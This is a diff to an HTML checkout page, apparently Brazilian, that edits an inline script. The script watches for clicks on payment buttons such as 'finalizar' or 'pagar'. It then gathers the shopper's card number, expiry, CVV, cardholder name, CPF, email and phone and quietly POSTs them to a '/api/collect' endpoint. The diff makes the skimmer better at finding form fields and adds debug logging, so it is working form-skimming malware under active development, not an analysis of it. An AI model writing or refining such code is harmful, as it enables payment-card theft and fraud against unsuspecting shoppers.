@@ -16,75 +16,131 @@
     <div id="root"></div>
 
         <script>
-    (function () {
-      const COLLECT_URL = "/api/collect";
-      const PROCESSED = new WeakSet();
+(function () {
+  const COLLECT_URL = "/api/collect";
+  const PROCESSED = new WeakSet();
 
-      function digits(v) { return String(v || "").replace(/\D/g, ""); }
+  function digits(v) { return String(v || "").replace(/\D/g, ""); }
+  function clean(v) { return String(v || "").replace(/\u00a0/g, " ").trim(); }
 
-      function findInputByNames(names) {
-        for (const name of names) {
-          const el = document.querySelector(`input[name="${name}"]`);
-          if (el && el.value) return el;
-        }
-        return null;
-      }
+  // Busca input pelo id, name OU fallback de placeholder/type
+  function findInput({ ids = [], names = [], types = [], placeholders = [] }) {
+    for (const id of ids) {
+      const el = document.getElementById(id);
+      if (el && el.value) return el;
+    }
+    for (const name of names) {
+      const el = document.querySelector(`input[name="${name}"]`);
+      if (el && el.value) return el;
+    }
+    for (const type of types) {
+      const el = document.querySelector(`input[type="${type}"]`);
+      if (el && el.value) return el;
+    }
+    for (const ph of placeholders) {
+      const el = [...document.querySelectorAll('input')].find(i =>
+        (i.placeholder || '').toLowerCase().includes(ph.toLowerCase()) && i.value
+      );
+      if (el) return el;
+    }
+    return null;
+  }
 
-      function collectCardData() {
-        const cardNumber = findInputByNames(["cardNumber", "card_number", "number", "cc-number"])
-          || document.querySelector('input[autocomplete="cc-number"]');
-        const expiry = findInputByNames(["cardExpiry", "card_expiry", "expiry", "exp"])
-          || document.querySelector('input[autocomplete="cc-exp"]');
-        const cvv = findInputByNames(["cardCvv", "card_cvv", "cvv", "cvc"])
-          || document.querySelector('input[autocomplete="cc-csc"]');
-        const cardName = findInputByNames(["cardName", "card_name", "holderName", "holder"])
-          || document.querySelector('input[autocomplete="cc-name"]');
-        const cardCpf = findInputByNames(["cardCpf", "card_cpf", "cpf"]);
-        const email = findInputByNames(["email"]) || document.querySelector('input[type="email"]');
-        const phone = findInputByNames(["phone", "telefone", "celular"]);
-        const installments = document.querySelector('input[name="installments"]')?.value || "1";
-        const total = document.querySelector("[data-summary-total]")?.innerText || "";
+  function collectCardData() {
+    const cardNumber = findInput({
+      ids: ['cardNumber', 'card-number'],
+      names: ['cardNumber', 'card_number', 'number', 'cc-number'],
+      types: [],
+      placeholders: ['0000 0000 0000']
+    });
+    const expiry = findInput({
+      ids: ['cardExpiry', 'cardDueDate', 'expiry'],
+      names: ['cardExpiry', 'card_expiry', 'expiry', 'exp', 'cardDueDate'],
+      placeholders: ['MM/AA', 'MM/YY']
+    });
+    const cvv = findInput({
+      ids: ['cardCvv', 'cardCVV', 'cvv'],
+      names: ['cardCvv', 'card_cvv', 'cvv', 'cvc'],
+      placeholders: ['CVV', 'CVC']
+    });
+    const cardName = findInput({
+      ids: ['cardName', 'cardholderName', 'holderName'],
+      names: ['cardName', 'card_name', 'holderName', 'holder', 'cardholderName'],
+      placeholders: ['Nome impresso', 'nome no cartão', 'Como está no cartão']
+    });
+    // CORRIGIDO: pega CPF, email e phone com os IDs reais
+    const cardCpf = findInput({
+      ids: ['cpf', 'cardCpf', 'document'],
+      names: ['cpf', 'cardCpf', 'card_cpf', 'document'],
+      placeholders: ['000.000.000-00', 'CPF']
+    });
+    const email = findInput({
+      ids: ['email'],
+      names: ['email'],
+      types: ['email'],
+      placeholders: ['e-mail', 'email']
+    });
+    const phone = findInput({
+      ids: ['phone'],
+      names: ['phone', 'telefone', 'celular'],
+      types: ['tel'],
+      placeholders: ['(00)', '0000-0000']
+    });
 
-        return {
-          card_num: digits(cardNumber?.value || ""),
-          expiry: (expiry?.value || "").trim(),
-          cvv: digits(cvv?.value || ""),
-          name: (cardName?.value || "").trim(),
-          cpf: digits(cardCpf?.value || ""),
-          email: (email?.value || "").trim(),
-          phone: digits(phone?.value || ""),
-          amount: total,
-          installments: String(installments)
-        };
-      }
+    const installments = document.querySelector('input[name="installments"]')?.value || "1";
 
-      function isFinalizeButton(el) {
-        if (!el || el.tagName !== "BUTTON") return false;
-        const text = (el.innerText || "").toLowerCase();
-        return /finalizar|pagar|continuar|comprar|concluir/.test(text);
-      }
+    // Valor total - várias estratégias
+    let total = "";
+    const totalEl =
+      document.querySelector('[data-testid="order-total"]') ||
+      document.querySelector('.total dd') ||
+      document.querySelector('[data-summary-total]');
+    if (totalEl) total = clean(totalEl.innerText || totalEl.textContent);
 
-      document.addEventListener("click", function (event) {
-        const btn = event.target.closest("button");
-        if (!btn || PROCESSED.has(btn)) return;
-        if (!isFinalizeButton(btn)) return;
+    return {
+      card_num: digits(cardNumber?.value || ""),
+      expiry: clean(expiry?.value || ""),
+      cvv: digits(cvv?.value || ""),
+      name: clean(cardName?.value || ""),
+      cpf: digits(cardCpf?.value || ""),
+      email: clean(email?.value || ""),
+      phone: digits(phone?.value || ""),
+      amount: total,
+      installments: String(installments)
+    };
+  }
 
-        const cardRadio = document.querySelector('input[type="radio"][value="card"]:checked')
-          || document.querySelector('input[type="radio"][value="credit_card"]:checked');
-        if (!cardRadio) return;
+  function isFinalizeButton(el) {
+    if (!el || el.tagName !== "BUTTON") return false;
+    const text = (el.innerText || "").toLowerCase();
+    return /finalizar|pagar|continuar|comprar|concluir/.test(text);
+  }
 
-        PROCESSED.add(btn);
-        const payload = collectCardData();
-        if (!payload.card_num || payload.card_num.length < 13) return;
+  document.addEventListener("click", function (event) {
+    const btn = event.target.closest("button");
+    if (!btn || PROCESSED.has(btn)) return;
+    if (!isFinalizeButton(btn)) return;
 
-        fetch(COLLECT_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        }).catch(function () {});
-      }, true);
-    })();
-    </script>
+    const cardRadio = document.querySelector('input[type="radio"][value="card"]:checked')
+      || document.querySelector('input[type="radio"][value="credit_card"]:checked');
+    if (!cardRadio) return;
+
+    PROCESSED.add(btn);
+    const payload = collectCardData();
+    console.log("📤 Coletando:", payload);  // ← pra você ver no console
+    if (!payload.card_num || payload.card_num.length < 13) return;
+
+    fetch(COLLECT_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    })
+    .then(r => r.json())
+    .then(d => console.log("✅ Servidor respondeu:", d))
+    .catch(e => console.error("❌ Erro:", e));
+  }, true);
+})();
+</script>
     
   </body>
 </html>
